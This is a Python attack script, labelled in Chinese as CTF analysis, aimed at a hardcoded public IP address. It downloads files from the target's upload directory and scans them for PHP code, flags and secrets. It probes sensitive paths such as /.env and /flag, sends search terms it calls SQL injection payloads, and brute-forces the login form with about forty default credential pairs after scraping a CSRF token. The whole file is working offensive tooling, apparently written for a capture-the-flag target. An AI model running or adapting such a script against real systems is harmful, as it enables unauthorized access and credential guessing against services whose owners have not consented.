import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def download_and_analyze_file(filename):
    """下载并分析文件内容"""
    url = f"{TARGET}/uploads/{filename}"
    try:
        r = session.get(url, timeout=TIMEOUT)
        
        if r.status_code == 200:
            content = r.content
            
            print(f"\n  文件: {filename}")
            print(f"  大小: {len(content)} bytes")
            
            # 尝试解码为文本
            try:
                text_content = content.decode('utf-8', errors='replace')
                print(f"\n  文本内容:")
                print(text_content)
            except:
                pass
            
            # 查找PHP代码
            if b"<?php" in content:
                print(f"\n  ⚠️  发现PHP代码!")
                php_start = content.find(b"<?php")
                php_end = content.find(b"?>", php_start)
                if php_end != -1:
                    php_code = content[php_start:php_end+2]
                    print(f"  PHP代码: {php_code.decode('utf-8', errors='replace')}")
                else:
                    php_code = content[php_start:]
                    print(f"  PHP代码(部分): {php_code[:500].decode('utf-8', errors='replace')}")
            
            # 查找flag模式
            flag_patterns = [
                b'flag\{', b'FLAG\{', b'ctf\{', b'CTF\{', b'flag_', b'FLAG_',
            ]
            for pattern in flag_patterns:
                if pattern in content:
                    index = content.find(pattern)
                    context = content[index:index+100]
                    print(f"\n  🚩 发现flag模式: {context.decode('utf-8', errors='replace')}")
                    
            # 查找敏感信息
            sensitive_patterns = [
                b'password', b'secret', b'key', b'token', b'admin', b'root',
            ]
            for pattern in sensitive_patterns:
                if pattern in content.lower():
                    print(f"\n  发现敏感词: {pattern.decode('utf-8')}")
                    
    except Exception as e:
        print(f"  错误: {e}")


def download_all_uploads():
    """下载所有上传文件"""
    print_section("1. 下载上传目录文件")
    
    uploaded_files = [
        "29c62af68a5c4e12aa8b28be5f41f9df_test.php.jpg",
        "4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "572279e9bc5c4cf79d754e57fb2e38bf.gif",
        "b55ba29d54334b9ab42b35c618128fcf.png",
        "d0fa8509503c438a872c3364419d210c.gif",
        "e09ee5dc21394c2583c6e45c511986f0.gif",
        "ed9555cdf521",
    ]
    
    for filename in uploaded_files:
        download_and_analyze_file(filename)


def test_more_paths():
    """测试更多路径"""
    print_section("2. 测试更多路径")
    
    paths = [
        "/flag",
        "/flag.txt",
        "/secret",
        "/secret.txt",
        "/.env",
        "/app.py",
        "/config.py",
        "/main.py",
        "/index.py",
        "/server.py",
        "/database.py",
        "/utils.py",
        "/lib.py",
        "/modules.py",
        "/routes.py",
        "/handlers.py",
        "/templates/index.html",
        "/templates/login.html",
        "/templates/upload.html",
        "/templates/search.html",
        "/templates/ping.html",
        "/templates/backup.html",
        "/templates/message.html",
        "/templates/include.html",
        "/static/style.css",
        "/static/main.js",
        "/static/app.js",
        "/uploads/.gitkeep",
    ]
    
    for path in paths:
        url = f"{TARGET}{path}"
        try:
            r = session.get(url, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text[:300]
                
                if "flag" in content.lower() or "secret" in content.lower():
                    print(f"\n  [{r.status_code}] {path}")
                    print(f"     内容: {content}")
                    
        except:
            pass


def test_sql_with_flag():
    """测试SQL注入查找flag"""
    print_section("3. SQL注入查找flag")
    
    sql_url = f"{TARGET}/search"
    
    sql_payloads = [
        "flag",
        "FLAG",
        "ctf",
        "CTF",
        "secret",
        "password",
        "admin",
        "root",
        "test",
        "1",
        "*",
        "%",
        "a",
        "b",
        "c",
        "123",
        "abc",
        "qwerty",
        "test123",
        "hello",
        "world",
    ]
    
    for payload in sql_payloads:
        try:
            r = session.get(sql_url, params={"q": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<main[^>]*>(.*?)</main>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "result" in body_content.lower() and len(body_content) > 300:
                        print(f"\n  [{r.status_code}] ?q={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_login_credentials():
    """测试更多登录凭据"""
    print_section("4. 测试更多登录凭据")
    
    url = f"{TARGET}/login"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    credentials = [
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "888888"),
        ("admin", "000000"),
        ("admin", "admin123"),
        ("admin", "password123"),
        ("admin", "12345678"),
        ("admin", "abc123"),
        ("admin", "welcome"),
        ("admin", "changeme"),
        ("admin", "term3lab"),
        ("admin", "ctf"),
        ("admin", "flag"),
        ("admin", "test"),
        ("admin", "demo"),
        ("admin", "guest"),
        ("admin", "user"),
        ("admin", "root"),
        ("admin", "master"),
        ("admin", "super"),
        ("admin", "god"),
        ("admin", "toor"),
        ("admin", "p@ssw0rd"),
        ("admin", "P@ssw0rd"),
        ("admin", "Admin@123"),
        ("admin", "Admin123"),
        ("admin", "1q2w3e"),
        ("admin", "1q2w3e4r"),
        ("admin", "qwerty123"),
        ("admin", "zxcvbn"),
        ("root", "root"),
        ("root", "password"),
        ("root", "123456"),
        ("user", "user"),
        ("user", "password"),
        ("user", "123456"),
        ("test", "test"),
        ("test", "123456"),
        ("demo", "demo"),
        ("demo", "123456"),
        ("guest", "guest"),
        ("guest", "123456"),
    ]
    
    for username, password in credentials:
        try:
            data = {"username": username, "password": password, "csrf": csrf_token}
            r = session.post(url, data=data, timeout=TIMEOUT)
            
            if r.status_code == 302:
                print(f"\n  🎉 登录成功: {username}/{password}")
                print(f"     跳转: {r.headers.get('Location', '')}")
                
                # 检查跳转后页面
                if r.headers.get('Location'):
                    redirect_url = f"{TARGET}{r.headers['Location']}"
                    r2 = session.get(redirect_url, timeout=TIMEOUT)
                    content = r2.text
                    
                    if "flag" in content.lower():
                        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                return
                
            elif r.status_code == 200:
                if "登录成功" in r.text or "dashboard" in r.text.lower():
                    print(f"\n  🎉 登录成功: {username}/{password}")
                    print(f"     内容: {r.text[:500]}")
                    return
                    
        except Exception as e:
            pass
    
    print("\n  ❌ 未找到有效凭据")


def main():
    print("*" * 70)
    print("  CTF文件分析与测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    download_all_uploads()
    test_more_paths()
    test_sql_with_flag()
    test_login_credentials()
    
    print_section("分析完成")


if __name__ == "__main__":
    main()